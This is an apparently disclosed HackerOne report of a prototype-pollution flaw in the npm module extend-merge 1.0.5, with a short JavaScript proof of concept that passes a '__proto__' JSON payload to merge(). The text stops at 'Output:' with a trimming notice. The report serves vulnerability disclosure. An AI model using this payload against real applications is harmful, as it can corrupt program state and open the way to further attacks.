# [H] [extend-merge] Prototype pollution

## Summary
Severity: High
Program: Node.js third-party modules
Weakness: Modification of Assumed-Immutable Data (MAID)
Reporter: d3lla
State: resolved
Disclosed: 2020-09-06T13:00:50.364Z
Source: https://hackerone.com/reports/878339

## Details
I would like to report a `prototype pollution` vulnerability in `extend-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `extend-merge`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/extend-merge`

## Module Description

Shallow extend and deep merge utility function.

## Module Stats

[48] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `extend-merge` module:
    - `npm i extend-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const extend_merge = require('extend-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
extend_merge.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:

_Trimmed to 38 lines — full report: https://hackerone.com/reports/878339_
